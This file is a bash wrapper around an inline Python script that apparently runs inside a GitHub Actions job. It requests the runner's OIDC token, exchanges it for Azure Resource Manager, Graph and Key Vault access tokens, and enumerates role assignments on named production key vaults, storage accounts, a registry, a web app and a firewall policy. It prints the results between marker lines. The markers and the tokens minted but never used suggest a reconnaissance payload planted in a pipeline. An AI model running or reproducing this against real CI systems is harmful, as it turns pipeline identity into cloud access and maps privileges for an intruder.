#!/usr/bin/env bash
set +e
exec python3 - <<'PY'
import os, json, urllib.request, urllib.parse, urllib.error, base64

def ex(u, data=None, headers=None, method=None):
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, data=data, headers=headers or {}, method=method), timeout=30)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, repr(e)[:300]

def jdecode(t):
    try:
        p = t.split(".")[1]; p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception as e:
        return {"err": repr(e)}

TEN = os.environ.get("AZURE_TENANT_ID", "")
CID = os.environ.get("AZURE_CLIENT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
print("===Q_START===")

u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange"
s, b = ex(u, headers={"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
oidc = json.loads(b).get("value", "")
print("OIDC_LEN", len(oidc))
print("OIDC_CLAIMS", json.dumps({k: jdecode(oidc).get(k) for k in ("iss", "sub", "aud", "actor", "job_workflow_ref", "repository")}))

def aad(cid, scope, secret=None, assertion=None):
    d = {"grant_type": "client_credentials", "client_id": cid, "scope": scope}
    if assertion:
        d["client_assertion_type"] = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
        d["client_assertion"] = assertion
    if secret:
        d["client_secret"] = secret
    s, b = ex("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TEN,
              data=urllib.parse.urlencode(d).encode(),
              headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        return json.loads(b).get("access_token", "")
    except Exception:
        print("AAD_ERR", cid[:8], scope, s, b[:200]); return ""

ARM = aad(CID, "https://management.azure.com/.default", assertion=oidc)
GRAPH = aad(CID, "https://graph.microsoft.com/.default", assertion=oidc)
VAULT = aad(CID, "https://vault.azure.net/.default", assertion=oidc)
print("CI_TOKENS arm=%d graph=%d vault=%d" % (len(ARM), len(GRAPH), len(VAULT)))

def q(u, tok, m="GET"):
    h = {"Authorization": "Bearer " + tok}
    if m == "POST":
        h["Content-Length"] = "0"
    return ex(u, data=b"" if m == "POST" else None, headers=h, method=m)

RG = "/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea" % SUB
RESS = [
  "Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz",
  "Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz",
  "Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz",
  "Microsoft.Storage/storageAccounts/sttblbackupprodx3euoz",
  "Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz",
  "Microsoft.Storage/storageAccounts/sttblarchiveprodx3euoz",
  "Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz",
  "Microsoft.Web/sites/app-tbl-storefront-prod",
  "Microsoft.Web/serverFarms/asp-tbl-prod",
  "Microsoft.Cdn/profiles/afd-tbl-prod",
  "Microsoft.Network/frontdoorWebApplicationFirewallPolicies/waftblstorefrontprod",
]
for res in RESS:
    s, b = q("https://management.azure.com%s/%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % (RG, res), ARM)
    try:
        for ra in json.loads(b).get("value", []):
            p = ra["properties"]
            print("RES_RA", res.split("/")[-1], "|", p["principalId"], "|", p["roleDefinitionId"].split("/")[-1], "|", p["principalType"])
    except Exception:
        print("RES_RA_ERR", res.split("/")[-1], s, b[:200])
print("===Q_END===")
